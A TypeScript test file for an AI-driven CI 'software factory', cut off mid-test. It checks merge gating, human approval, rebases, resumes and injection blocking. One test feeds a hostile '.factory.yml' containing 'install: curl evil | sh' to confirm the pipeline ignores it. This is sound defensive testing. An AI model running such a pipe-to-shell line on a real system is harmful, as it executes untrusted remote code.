import { existsSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { expect, test, vi } from "vitest";
// targets/react_frontend.yml keeps its placeholder approver until go-live, and loadTarget refuses it.
// makeContext loads the real file, so these tests fill in an approver.
vi.mock("../config", async (importOriginal) => {
  const real = await importOriginal<typeof import("../config")>();
  return { ...real, loadTarget: (name: string) => real.loadTarget(name, { defaultApprover: "approver" }) };
});
import { prompt, runStep, save, ticketText } from "./context";
import { previewLine } from "./prepare-patch";
import { parseFactoryFile } from "../config";
import { cancelNote, endIfClosed, handleRequests, parseStoppedNote, resumeSwitchedOff, stoppedNote } from "./run";
import { makeContext } from "../compose";
import { reviewerPrompt, type Finding } from "../agents";
import { GitLab, GITLAB_URL } from "../gitlab";
import { makeGitLabTracker } from "../adapters/gitlab-tracker";
import { NotFactoryRunError, type Mark } from "../seams";
import { newRecord, saveRecord } from "../record";
import { loadRecord, type RunRecord } from "../record";
import { fakeDashboard } from "../fakes";
import { runEvent, SWITCHES, type ControlRequest, type SwitchName } from "../run-events";
import * as apply from "./apply";
import * as verify from "./verify";
import { findSecrets } from "../rules";
import { DIFF } from "../fakes";
import * as decision from "./decision";
import * as event from "./event";
import * as resultSaved from "./result-saved";
import * as triage from "./triage";
import { BOT, B, PNG, TEST_PROOF, VISUAL_PROOF, fakeWorld, type WorldOptions, mrEvent, runBuildJobs, runBuildPipeline, runFinishPipeline, COMMIT } from "./test-helpers";

test("trivial ticket: build pipeline ends in auto-merge with no person", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, reviews: [[]], gate: "green", jev2: "pass" }));
  expect(w.states).toEqual(["running"]);
  expect(w.finishTriggered).toBe(true);
  expect(w.cards).toHaveLength(0);
});
test("a watcher ticket from fake errors stops at needs_approval even when it could merge alone", async () => {
  const w = fakeWorld({ jev1: { risk: "trivial" } });
  w.tracker.tickets.get("8")!.marks = ["watcher"];
  expect(w.ctx.seams.logSource).toBe("files");
  await runBuildPipeline(w);
  expect(w.finishTriggered).toBe(false);
  expect(w.states).toEqual(["needs_approval"]);
  const reason = "this ticket comes from fake errors (logSource files), so a person must merge it";
  expect(w.record.steps.find((s) => s.step === "decision")?.data).toEqual({ kind: "needs_approval", reasons: [reason] });
  expect(w.cards.map((c) => [c.kind, c.lines])).toEqual([["needs_approval", [reason]]]);
});
test("medium ticket: stops at decision with reasons on the MR and a Teams card", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "medium" }, reviews: [[]], gate: "green", jev2: "pass" }));
  expect(w.states).toEqual(["needs_approval"]);
  expect(w.mrComments.at(-1)).toContain("risk");
  expect(w.mrComments.at(-1)).toContain("This change needs a person to review and merge it:");
  expect(w.cards.map(c => c.kind)).toEqual(["needs_approval"]);
});
test("usage limit mid-run labels factory_waiting and keeps the session", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "low" }, prepare: "limit" }));
  expect(w.states).toEqual(["waiting"]);
  expect(w.record.steps.at(-1)).toMatchObject({ step: "prepare-patch", data: { sessionId: expect.any(String) } });
});
test("finish pipeline merges, waits for the develop pipeline and closes the work item", async () => {
  const w = await runFinishPipeline(fakeWorld({ mainPipeline: "success" }));
  expect(w.mainPipelineRef).toBe("develop");
  expect(w.states).toEqual(["done"]);
  expect(w.closed).toBe(true);
  expect(w.cards.map(c => c.kind)).toEqual(["done"]);
});
test("injection at triage blocks, assigns a person and sends one card", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { injectionYes: 0.4 } }));
  expect(w.states).toEqual(["blocked"]);
  expect(w.assigned).toBe(true);
  expect(w.cards.map(c => c.kind)).toEqual(["blocked"]);
  expect(w.claudeCalls).toBe(0);
});
test("five failed review rounds block with the open findings posted", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "low" }, reviews: [[B], [B], [B], [B], [B]] }));
  expect(w.states).toEqual(["blocked"]);
  expect(w.workItemComments.at(-1)).toContain(B.text);
});
test("the work item gets a mark for each step it passed, and none for a failed code review or later", async () => {
  const passed = await runBuildPipeline(fakeWorld({ jev1: { risk: "low" }, reviews: [[]] }));
  expect(passed.tracker.tickets.get("8")!.marks).toEqual(["triaged", "risk_low", "implemented", "reviewed", "checked", "risk_checked"]);
  const failed = await runBuildPipeline(fakeWorld({ jev1: { risk: "low" }, reviews: [[B], [B], [B], [B], [B]] }));
  expect(failed.tracker.tickets.get("8")!.marks).toEqual(["triaged", "risk_low", "implemented"]);
});
test("a red develop pipeline opens a revert MR and blocks", async () => {
  const w = await runFinishPipeline(fakeWorld({ mainPipeline: "failed" }));
  expect(w.revertOpened).toBe(true);
  expect(w.states).toEqual(["blocked"]);
});

// Controller rulings.
test("event reads live labels: an active run on the work item stops quietly", async () => {
  const w = await runBuildPipeline(fakeWorld({ state: "needs_approval" }));
  expect(w.record.steps.map((s) => s.step)).toEqual(["event"]);
  expect(w.record.steps[0].data).toMatchObject({ start: false, reason: "active-run" });
  expect(w.workItemComments).toHaveLength(0);
});
test("a Jev failure at triage blocks with the error and a card", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: "throw" }));
  expect(w.states).toEqual(["blocked"]);
  expect(w.workItemComments.at(-1)).toContain("HTTP 503");
  expect(w.cards.map((c) => c.kind)).toEqual(["blocked"]);
  expect(w.claudeCalls).toBe(0);
});
test("a Jev failure at the risk check sends the change to a person with the error", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, jev2: "throw" }));
  expect(w.finishTriggered).toBe(false);
  expect(w.states).toEqual(["needs_approval"]);
  expect(w.mrComments.at(-1)).toContain("HTTP 503");
});
test("unreadable numstat fails the hard rules and sends the change to a person", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, numstat: "garbage\0" }));
  expect(w.finishTriggered).toBe(false);
  expect(w.states).toEqual(["needs_approval"]);
  expect(w.mrComments.at(-1)).toContain("Bad numstat");
});
test("a red merge request pipeline sends the change to a person", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, mrPipeline: "failed" }));
  expect(w.finishTriggered).toBe(false);
  expect(w.mrComments.at(-1)).toContain("pipeline");
});
test("apply does not merge while the merge request pipeline is not green", async () => {
  const w = await runFinishPipeline(fakeWorld({ mrPipeline: "failed" }));
  expect(w.merged).toBe(false);
  expect(w.states).toEqual(["blocked"]);
});
test("the MR closes the work item and carries the reason for a changed test", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, testChanges: "Updated the List snapshot for the spinner." }));
  expect(w.mrDescription).toContain("Closes #8");
  expect(w.mrDescription).toContain("Updated the List snapshot for the spinner.");
});
test("unclear ticket: questions are posted and the label is needs_info", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { clarity: 4 } }));
  expect(w.states).toEqual(["needs_info"]);
  expect(w.workItemComments.at(-1)).toContain("1. Which list?");
  expect(w.cards.map((c) => c.kind)).toEqual(["needs_info"]);
});

// Spec 6.5: only a person's merge starts the finish run.
test("a person's merge of a waiting MR starts the finish pipeline with the build record and apply skipped", async () => {
  const w = await runBuildPipeline(fakeWorld({ payload: mrEvent(), state: "needs_approval" }));
  expect(w.finishVars).toEqual({ kind: "finish", ticket: "8", change: "5", buildRun: "41", skipApply: true });
  expect(w.states).toEqual(["running"]);
  expect(w.claudeCalls).toBe(0);
});
test("GitLab's approval event starts nothing", async () => {
  const payload = JSON.parse(readFileSync(fileURLToPath(new URL("../fixtures/mr-approved.json", import.meta.url)), "utf8"));
  const w = fakeWorld({ payload, state: "needs_approval" });
  w.tracker.parseEvent = makeGitLabTracker(undefined as never, w.ctx.target.projectPath).parseEvent; // the real webhook parser
  await runBuildPipeline(w);
  expect(w.finishTriggered).toBe(false);
  expect(w.record.steps[0].data).toMatchObject({ start: false, reason: "not-added" });
  expect(w.states).toEqual(["needs_approval"]);
});
test("the build run is found in a change body edited in the web UI, with CRLF line ends", async () => {
  const crlf = fakeWorld({ payload: mrEvent(), state: "needs_approval" });
  crlf.openChange("Factory run 41: https://ci.example/runs/41\r\nChanged tests, and why:\r\n");
  await runBuildPipeline(crlf);
  expect(crlf.finishVars).toMatchObject({ kind: "finish", buildRun: "41" });
});
test("the change body names the build run, so finish can load its record", async () => {
  const b = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" } }));
  expect(b.mrDescription).toMatch(/^Factory run 1: https:\/\/ci\.example\/runs\/1$/m);
});
test("merges by the bot or a non-developer, or of an MR not waiting for a person, start nothing", async () => {
  for (const o of [
    { payload: mrEvent(BOT), state: "needs_approval" },
    { payload: mrEvent(), state: "needs_approval", actorLevel: 20 },
    { payload: mrEvent(), state: "running" },
  ] as WorldOptions[]) expect((await runBuildPipeline(fakeWorld(o))).finishTriggered).toBe(false);
});
test("finish after a manual merge does not merge again and verifies the merge commit", async () => {
  const w = await runFinishPipeline(fakeWorld({ mrState: "merged" }), { decision: "needs_approval", skipApply: true });
  expect(w.mainPipelineRef).toBe("develop");
  expect(w.merged).toBe(false);
  expect(w.record.steps.find((s) => s.step === "apply")?.data).toMatchObject({ sha: "manual789", skipped: true });
  expect(w.states).toEqual(["done"]);
});

// Apply's merge rule.
test("apply never merges a change that waits for a person", async () => {
  const w = await runFinishPipeline(fakeWorld(), { decision: "needs_approval" });
  expect(w.merged).toBe(false);
  expect(w.states).toEqual(["blocked"]);
  expect(w.workItemComments.at(-1)).toContain("waits for a person to merge it");
});
test("the auto path merges the reviewed commit and posts the decision on the MR", async () => {
  const b = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" } }));
  expect(b.mrComments.at(-1)).toContain("without a person");
  expect(b.finishVars.buildRun).toBe("1");
  expect(b.record.steps.find((s) => s.step === "risk-check")?.data).toMatchObject({ headSha: "head5" });
  expect((await runFinishPipeline(fakeWorld())).mergedSha).toBe("head5");
});
test("the auto path squash merges the reviewed commit with [AM], the commit message and the MR link", async () => {
  const w = await runFinishPipeline(fakeWorld());
  expect(w.mergedSha).toBe("head5");
  expect(w.host.mergeMessage).toBe(`[AM] ${COMMIT.message}\nMerge request: https://host.example/changes/5`);
});
test("apply does not merge a change that targets another branch than the base branch", async () => {
  const w = await runFinishPipeline(fakeWorld({ mrTarget: "master" }));
  expect(w.merged).toBe(false);
  expect(w.states).toEqual(["blocked"]);
  expect(w.workItemComments.at(-1)).toContain("targets master, not develop");
});

// A person can change the change while apply waits for the pipeline; the merge reads it again.
const duringWait = (w: ReturnType<typeof fakeWorld>, patch: { target?: string; open?: boolean }) => {
  const { change, checks } = w.host;
  w.host.checks = async (at) => {
    const r = await checks(at);
    if ("change" in at) w.host.change = async (ref) => ({ ...(await change(ref)), ...patch });
    return r;
  };
};
test("apply does not merge a change that was retargeted to master while it waited for the pipeline", async () => {
  const w = fakeWorld();
  duringWait(w, { target: "master" });
  await runFinishPipeline(w);
  expect(w.merged).toBe(false);
  expect(w.states).toEqual(["blocked"]);
  expect(w.workItemComments.at(-1)).toContain("targets master, not develop");
});
test("apply does not merge a change that was closed or merged while it waited for the pipeline", async () => {
  for (const patch of [{ open: false }, { open: false, merged: true }]) {
    const w = fakeWorld();
    duringWait(w, patch);
    await runFinishPipeline(w);
    expect(w.merged).toBe(false);
    expect(w.states).toEqual(["blocked"]);
    expect(w.workItemComments.at(-1)).toContain("is no longer open");
  }
});

// Spec 6.4: rebase before an auto merge.
test("a change behind develop is rebased, checked on the rebased head, then merged", async () => {
  const w = fakeWorld({ behind: 1 });
  const seen: string[] = [];
  const checks = w.host.checks;
  w.host.checks = async (at) => (seen.push(at.sha), checks(at));
  await runFinishPipeline(w);
  expect(w.host.rebases).toBe(1);
  expect(w.mergedSha).toBe("head5-r1");
  expect(seen).toEqual(["head5-r1", "manual789"]); // apply checks only the rebased head; verify checks the landed commit
  expect(w.record.steps.find((s) => s.step === "apply")?.data).toMatchObject({ sha: "manual789", reviewed: "head5", rebased: ["head5-r1"] });
});
test("a merge that develop outran is rebased again, then merged", async () => {
  const w = await runFinishPipeline(fakeWorld({ behind: 2 }));
  expect(w.host.rebases).toBe(2);
  expect(w.mergedSha).toBe("head5-r2");
});
test("after 3 rebases when develop keeps moving, a person rebases and merges", async () => {
  const w = await runFinishPipeline(fakeWorld({ behind: 4 }));
  expect(w.host.rebases).toBe(3);
  expect(w.merged).toBe(false);
  expect(w.states).toEqual(["needs_approval"]);
  expect(w.mrComments.at(-1)).toContain("fell behind develop again after 3 rebases");
  expect(w.assigned).toBe(true);
});
test("a failed rebase sends the change to a person to rebase and merge", async () => {
  const w = await runFinishPipeline(fakeWorld({ behind: 1, rebaseFails: true }));
  expect(w.merged).toBe(false);
  expect(w.states).toEqual(["needs_approval"]);
  expect(w.mrComments.at(-1)).toContain("Rebase failed: conflict in src/List.tsx");
  expect(w.mrComments.at(-1)).toContain("Rebase it by hand and merge it");
  expect(w.assigned).toBe(true);
  expect(w.cards.map((c) => c.kind)).toContain("needs_approval");
});
test("a rebased change whose added or removed lines differ from the reviewed one is not merged", async () => {
  for (const diffs of [
    { "head5-r1": { "src/List.tsx": `${DIFF["src/List.tsx"]}+  sendToServer();\n` } },
    { "head5-r1": { ...DIFF, "src/Other.tsx": "@@ -0,0 +1 @@\n+export const x = 1;\n" } },
    { "head5-r1": {} },
  ] as WorldOptions["diffs"][]) {
    const w = await runFinishPipeline(fakeWorld({ behind: 1, diffs }));
    expect(w.merged).toBe(false);
    expect(w.workItemComments.at(-1)).toContain("is not the change that was reviewed");
  }
});
test("a rebased change that differs only by an added line that starts with ++ is not merged", async () => {
  const w = await runFinishPipeline(fakeWorld({ behind: 1, diffs: { "head5-r1": { "src/List.tsx": `${DIFF["src/List.tsx"]}+++i;\n` } } }));
  expect(w.merged).toBe(false);
  expect(w.workItemComments.at(-1)).toContain("is not the change that was reviewed");
});
test("a rebase that only moves the context around the changed lines still merges", async () => {
  const w = await runFinishPipeline(fakeWorld({ behind: 1, diffs: { "head5-r1": { "src/List.tsx": "@@ -9,2 +9,3 @@\n const other = 2;\n+  if (loading) return <Spinner />;\n" } } }));
  expect(w.mergedSha).toBe("head5-r1");
});
test("apply does not merge a branch someone pushed to after the review", async () => {
  const w = await runFinishPipeline(fakeWorld({ mrHead: "pushed1" }));
  expect(w.merged).toBe(false);
  expect(w.workItemComments.at(-1)).toContain("Someone pushed to change 5");
});
test("a merge GitLab refuses for another reason is not retried", async () => {
  const w = fakeWorld();
  w.host.merge = async () => { throw new Error("GitLab PUT /projects/1/merge_requests/5/merge failed with status 405"); };
  await expect(runFinishPipeline(w)).rejects.toThrow("status 405");
  expect(w.host.rebases).toBe(0);
});

// Re-run.
test("a re-run reuses the open MR of the factory branch", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, existingMr: true }));
  expect(w.mrOpened).toBe(false);
  expect(w.record.steps.find((s) => s.step === "precommit-gate")?.data).toMatchObject({ change: "5" });
});

// Minor fixes.
test("a block after the merge reopens the work item", async () => {
  const w = await runFinishPipeline(fakeWorld({ mainPipeline: "failed" }));
  expect(w.closed).toBe(false);
});
test("verify blocks when .factory.yml names a smoke test", async () => {
  const w = await runFinishPipeline(fakeWorld(), { smoke: "pnpm test:smoke" });
  expect(w.states).toEqual(["blocked"]);
  expect(w.workItemComments.at(-1)).toContain("smoke");
});

// runStep, the CI job body.
const tmp = () => mkdtempSync(join(tmpdir(), "runstep-"));
// A copy of seams.yml with a dashboard address: the real file keeps a placeholder until go-live.
const seamsFile = (dir: string, edit: (text: string) => string = (t) => t) => {
  const path = join(dir, "seams.yml");
  const text = readFileSync(fileURLToPath(new URL("../../seams.yml", import.meta.url)), "utf8");
  writeFileSync(path, edit(text.replace(/^dashboardUrl: .*$/m, "dashboardUrl: https://dashboard.example")));
  return path;
};
test("runStep skips when an earlier job stopped the run", async () => {
  const dir = tmp();
  writeFileSync(join(dir, "stop"), "event");
  let ran = false;
  await runStep("triage", async () => ((ran = true), "next"), { dir, make: () => fakeWorld().ctx });
  expect(ran).toBe(false);
});
test("runStep saves the record and writes the stop file on a stop", async () => {
  const dir = tmp();
  const w = fakeWorld({ state: "running" });
  await runStep("event", (await import("./event")).run, { dir, make: () => w.ctx });
  expect(readFileSync(join(dir, "stop"), "utf8")).toBe("event");
  expect(JSON.parse(readFileSync(join(dir, "record.json"), "utf8")).steps[0].step).toBe("event");
});
test("runStep sends the step's output with step_end when no CI job holds a log", async () => {
  const dir = tmp();
  const w = fakeWorld();
  w.ci.vars = { ...w.ci.vars, ticket: "8", job: undefined };
  saveRecord({ ...newRecord(), runId: "r1" }, dir);
  await runStep("triage", async () => (process.stdout.write("installed 12 packages\n"), "next"), { dir, make: () => w.ctx });
  const end = readFileSync(join(dirname(w.ctx.dir), "events.jsonl"), "utf8").trim().split("\n").map((l) => JSON.parse(l)).find((e) => e.type === "step_end");
  expect(end.data.log).toContain("installed 12 packages");
  w.ci.vars.job = "7";
  await runStep("triage", async () => (process.stdout.write("in the CI log\n"), "next"), { dir, make: () => w.ctx });
  expect(readFileSync(join(dirname(w.ctx.dir), "events.jsonl"), "utf8")).not.toContain("in the CI log");
});
test("runStep blocks the work item on an unexpected error and still fails the job", async () => {
  const dir = tmp();
  const w = fakeWorld();
  w.ci.vars.ticket = "8";
  await expect(runStep("code-review", async () => { throw new Error("reviewer crashed"); }, { dir, make: () => w.ctx })).rejects.toThrow("reviewer crashed");
  expect(w.states).toEqual(["blocked"]);
  expect(w.workItemComments.at(-1)).toContain("reviewer crashed");
  expect(existsSync(join(dir, "record.json"))).toBe(true);
});
test("finish waits for the build record, then blocks with the env work item if it never comes", async () => {
  const dir = tmp();
  let tries = 0;
  const w = fakeWorld();
  w.ci.vars = { ...w.ci.vars, payload: undefined, ticket: "8", change: "5", buildRun: "41" };
  w.ci.buildRecord = async () => { tries++; throw new Error("GitLab GET failed with status 404"); };
  let ran = false;
  await expect(runStep("apply", async () => ((ran = true), "next"), { dir, make: () => w.ctx })).rejects.toThrow(/build pipeline 41/);
  expect(tries).toBeGreaterThan(1);
  expect(ran).toBe(false);
  expect(w.states).toEqual(["blocked"]);
});
test("finish loads the build record once it is uploaded", async () => {
  const dir = tmp();
  const w = fakeWorld();
  w.ci.vars = { ...w.ci.vars, buildRun: "41" };
  let tries = 0;
  w.ci.buildRecord = async () => {
    if (++tries < 3) throw new Error("GitLab GET failed with status 404");
    return { ...w.ctx.record, workItem: "from-build" };
  };
  let seen = "";
  await runStep("apply", async (ctx) => ((seen = ctx.record.workItem), "next"), { dir, make: () => w.ctx });
  expect(seen).toBe("from-build");
});

// A build record from another run must not be used to merge.
test("apply blocks when the build record is for another work item", async () => {
  const w = await runFinishPipeline(fakeWorld(), { workItemIid: "9" });
  expect(w.merged).toBe(false);
  expect(w.workItemComments.at(-1)).toContain("another");
});
test("apply blocks when the build record is for another merge request", async () => {
  const w = await runFinishPipeline(fakeWorld(), { mrIid: "6" });
  expect(w.merged).toBe(false);
  expect(w.states).toEqual(["blocked"]);
});
test("decision blocks instead of starting finish without a build pipeline id", async () => {
  const w = fakeWorld({ jev1: { risk: "trivial" } });
  w.ci.vars.run = undefined;
  await runBuildPipeline(w);
  expect(w.finishTriggered).toBe(false);
  expect(w.states).toEqual(["blocked"]);
});

test("makeContext rejects a target with no targets/<name>.yml, and a job image the target does not name", () => {
  const dir = tmp();
  const env = (o: Record<string, string>) => {
    for (const k of ["gl", "teams", "dash"]) writeFileSync(join(dir, k), "x");
    return { CI_SERVER_URL: GITLAB_URL, CI_PROJECT_ID: "3", FACTORY_PIPELINE: "build", BERGET_API_KEY: "k", TENSORX_API_KEY: "k", FACTORY_GITLAB_TOKEN: join(dir, "gl"), TEAMS_WEBHOOK_URL: join(dir, "teams"), FACTORY_DASHBOARD_TOKEN: join(dir, "dash"), ...o };
  };
  const seams = seamsFile(dir);
  expect(() => makeContext(env({ FACTORY_TARGET: "nope" }), dir, seams)).toThrow(/Unknown FACTORY_TARGET/);
  expect(() => makeContext(env({ FACTORY_TARGET: "../router" }), dir, seams)).toThrow(/Unknown FACTORY_TARGET/);
  expect(() => makeContext(env({ FACTORY_TARGET: "react_frontend", CI_JOB_IMAGE: "evil/image:1" }), dir, seams)).toThrow(/image/);
  expect(() => makeContext(env({ FACTORY_TARGET: "react_frontend", CI_JOB_IMAGE: "node:22" }), dir, seams)).not.toThrow();
});
test("a target on GitHub needs only the GitHub token and builds the GitHub tracker and code host", () => {
  const dir = tmp();
  const env = (o: Record<string, string>) => {
    for (const k of ["gh", "dash"]) writeFileSync(join(dir, k), "x");
    return { FACTORY_PIPELINE: "build", FACTORY_TARGET: "musicapp_webapp", TENSORX_API_KEY: "k", FACTORY_DASHBOARD_TOKEN: join(dir, "dash"), ...o };
  };
  expect(() => makeContext(env({}), dir, seamsFile(dir))).toThrow(/FACTORY_GITHUB_TOKEN is not set/);
  const ctx = makeContext(env({ FACTORY_GITHUB_TOKEN: join(dir, "gh") }), dir, seamsFile(dir));
  expect(ctx.seams).toMatchObject({ tracker: "github-project", codeHost: "github" });
  expect(ctx.repo).toBeDefined();
});
test("a build record that fails the provenance check is not retried", async () => {
  const w = fakeWorld();
  w.ci.vars = { ...w.ci.vars, payload: undefined, ticket: "8", change: "5", buildRun: "41" };
  let tries = 0;
  w.ci.buildRecord = async () => { tries++; throw new NotFactoryRunError("Pipeline 41 is not a factory build pipeline"); };
  await expect(runStep("apply", async () => "next", { dir: tmp(), make: () => w.ctx })).rejects.toThrow(/not a factory build pipeline/);
  expect(tries).toBe(1);
  expect(w.states).toEqual(["blocked"]);
});

// decision starts the finish pipeline from inside its own job, so apply can poll before that job succeeds.
test("finish waits while the decision job is still running, then loads the record", async () => {
  const w = fakeWorld();
  w.ci.vars = { ...w.ci.vars, payload: undefined, ticket: "8", change: "5", buildRun: "41" };
  let jobPolls = 0;
  const fetchFn = (async (url: string) => {
    const path = url.replace("https://gl.example/api/v4", "");
    const body =
      path === "/projects/3/pipelines/41" ? { id: 41, source: "trigger", ref: "main", user: { id: 1 } } :
      path === "/projects/3" ? { id: 3, default_branch: "main" } :
      path === "/user" ? { id: 1 } :
      path.startsWith("/projects/3/pipelines/41/jobs") ? [{ id: 12, name: "decision", status: ++jobPolls <= 2 ? "running" : "success" }] :
      path === "/projects/3/jobs/12/artifacts/run/record.json" ? { ...w.ctx.record, workItem: "from-build" } : undefined;
    return new Response(JSON.stringify(body ?? {}), { status: body ? 200 : 404 });
  }) as unknown as typeof fetch;
  const real = new GitLab("https://gl.example", "tok", fetchFn);
  w.ci.buildRecord = async (run) => (await real.buildRecord(3, Number(run))) as RunRecord;
  let seen = "";
  await runStep("apply", async (ctx) => ((seen = ctx.record.workItem), "next"), { dir: tmp(), make: () => w.ctx });
  expect(jobPolls).toBe(3);
  expect(seen).toBe("from-build");
});

// Task 13: poller starts and resumed runs. Both come as trigger variables with no webhook payload.
test("a poller start with no payload claims the run from live labels", async () => {
  const w = fakeWorld({ jev1: { risk: "trivial" } });
  w.ci.vars = { ...w.ci.vars, payload: undefined, ticket: "8" };
  await runBuildPipeline(w);
  expect(w.record.steps[0]).toMatchObject({ step: "event", data: { start: true, ticket: "8", actor: "dev" } });
  expect(w.finishTriggered).toBe(true);
  for (const o of [{ state: "needs_info" }, { state: "ready", actorLevel: 20 }] as WorldOptions[]) {
    const q = fakeWorld(o);
    q.ci.vars = { ...q.ci.vars, payload: undefined, ticket: "8" };
    await runBuildPipeline(q);
    expect(q.record.steps.map((s) => s.step)).toEqual(["event"]);
    expect(q.record.steps[0].data).toMatchObject({ start: false });
    expect(q.states).toEqual([o.state]);
  }
});
test("a resume continues at the limited step with the saved session", async () => {
  const first = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, prepare: "limit" }));
  expect(first.workItemComments.at(-1)).toContain("Waiting run: pipeline 1");
  expect(first.workItemComments.at(-1)).toMatch(/^The author agent reached its usage limit\./); // the author may be any harness
  const w = fakeWorld({ jev1: { risk: "trivial" }, prepare: "limit", state: "waiting" });
  w.ci.vars = { ...w.ci.vars, payload: undefined, ticket: "8", buildRun: "1" };
  w.ci.buildRecord = async () => first.record;
  await runBuildJobs(w, tmp());
  expect(w.restored).toEqual(["1"]);
  expect(w.jevAsked).toBe(1); // only Jev 2: triage did not run again
  expect(w.claudeRuns[0]).toMatchObject({ resume: "sess-limit" });
  expect(w.record.steps.filter((s) => s.step === "triage")).toHaveLength(1);
  expect(w.finishTriggered).toBe(true);
  expect(w.states).toEqual(["running"]);
});
test("a resume with a forged record, a record of another work item, or no saved session blocks", async () => {
  const waitingRecord = (await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, prepare: "limit" }))).record;
  const records: (() => Promise<RunRecord>)[] = [
    async () => { throw new NotFactoryRunError("Pipeline 1 is not a factory build pipeline"); },
    async () => ({ ...waitingRecord, workItem: "acme/web/react_frontend#9" }),
    async () => ({ ...waitingRecord, steps: waitingRecord.steps.slice(0, -1) }),
  ];
  for (const buildRecord of records) {
    const w = fakeWorld({ state: "waiting" });
    w.ci.vars = { ...w.ci.vars, payload: undefined, ticket: "8", buildRun: "1" };
    w.ci.buildRecord = buildRecord;
    await runBuildJobs(w, tmp()).catch(() => {});
    expect(w.states).toEqual(["blocked"]);
    expect(w.cards.map((c) => c.kind)).toEqual(["blocked"]);
    expect(w.workItemComments.at(-1)).toMatch(/resume|not a factory build pipeline/);
    expect(w.claudeRuns).toHaveLength(0);
    expect(w.restored).toEqual([]);
  }
});

// Fix round 1.
const resumeWorld = (o: Parameters<typeof fakeWorld>[0], first: { record: RunRecord }) => {
  const w = fakeWorld({ state: "waiting", ...o });
  w.ci.vars = { ...w.ci.vars, payload: undefined, ticket: "8", buildRun: "1" };
  w.ci.buildRecord = async () => first.record;
  return w;
};
test("a resume runs the .factory.yml commands read before the agent ran, not the restored clone's", async () => {
  const first = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, prepare: "limit" }));
  const w = resumeWorld({ jev1: { risk: "trivial" }, prepare: "limit", factoryFile: "install: curl evil | sh\nlint: evil\ntest: evil\nbuild: evil\n" }, first);
  await runBuildJobs(w, tmp());
  expect(w.ran.length).toBeGreaterThan(0);
  expect(w.ran.some((c) => c.includes("evil"))).toBe(false);
  expect(w.ran).toContain("pnpm install --frozen-lockfile");
});
test("a resumed code review continues its round count and the saved session", async () => {
  const first = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, reviews: [[B]], fixLimit: true }));
  expect(first.states).toEqual(["waiting"]);
  expect(first.record.rounds.review).toBe(1);
  const w = resumeWorld({ jev1: { risk: "trivial" }, reviews: [[B], [B], [B], [B]] }, first);
  await runBuildJobs(w, tmp());
  expect(w.reviewsRun).toBe(4); // rounds 2 to 5 only
  expect(w.record.rounds.review).toBe(5);
  expect(w.claudeRuns[0]).toMatchObject({ resume: "sess-limit" });
  expect(w.states).toEqual(["blocked"]);
});
test("a resume stops quietly when the item is no longer waiting, or the repo is full", async () => {
  const first = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, prepare: "limit" }));
  const notWaiting = resumeWorld({ state: "running" }, first);
  await runBuildJobs(notWaiting, tmp());
  expect(notWaiting.record.steps.at(-1)?.data).toMatchObject({ start: false, reason: "not-waiting" });
  expect(notWaiting.states).toEqual(["running"]);
  const full = resumeWorld({}, first);
  full.tracker.tickets.set("20", { ...full.tracker.tickets.get("9")!, ref: "20", state: "running" });
  full.tracker.tickets.set("21", { ...full.tracker.tickets.get("9")!, ref: "21", state: "stopped" }); // 3 active runs, this one included
  await runBuildJobs(full, tmp());
  expect(full.record.steps.at(-1)?.data).toMatchObject({ start: false, reason: "repo-full" });
  for (const w of [notWaiting, full]) {
    expect(w.restored).toEqual([]);
    expect(w.claudeRuns).toHaveLength(0);
    expect(w.workItemComments).toHaveLength(0);
  }
  expect(full.states).toEqual(["waiting"]);
});
test("a resume whose record cannot be read now waits for the next retry instead of blocking", async () => {
  const w = fakeWorld({ state: "waiting" });
  w.ci.vars = { ...w.ci.vars, payload: undefined, ticket: "8", buildRun: "1" };
  w.ci.buildRecord = async () => { throw new Error("GitLab GET failed with status 503"); };
  const dir = tmp();
  await runBuildJobs(w, dir);
  expect(w.states).toEqual(["waiting"]);
  expect(w.workItemComments).toHaveLength(0);
  expect(readFileSync(join(dir, "stop"), "utf8")).toBe("event");
});

test("a resume whose record is gone for good blocks with a comment and a card", async () => {
  for (const error of ["GitLab GET failed with status 404", "Pipeline 1 has no successful decision job", "Unexpected token < in JSON"]) {
    const w = fakeWorld({ state: "waiting" });
    w.ci.vars = { ...w.ci.vars, payload: undefined, ticket: "8", buildRun: "1" };
    w.ci.buildRecord = async () => { throw new Error(error); };
    await runBuildJobs(w, tmp()).catch(() => {});
    expect(w.states, error).toEqual(["blocked"]);
    expect(w.cards.map((c) => c.kind)).toEqual(["blocked"]);
    expect(w.workItemComments.at(-1)).toContain(error);
  }
});

test("[skip ci] and [ci skip] never reach the commit or MR title, so the MR pipeline runs", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, title: "Fix list [SKIP CI] now [ci skip]" }));
  for (const t of [w.commitMessage, w.mrTitle]) expect(t).not.toMatch(/skip ci|ci skip/i);
  expect(w.mrTitle).toContain("Fix list");
});
const MSG = "feat(list): show a spinner while the list loads\n\n- Show a spinner in src/List.tsx while the list loads.\n- Cover it in src/List.test.tsx.";
const CLOSING = "Ticket: https://tracker.example/8\nFactory run 1: https://ci.example/runs/1\nThis was generated by AI in the software factory.";
test("the agent's commit message is the branch commit, the MR title and the Commit message section", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, commitFile: MSG }));
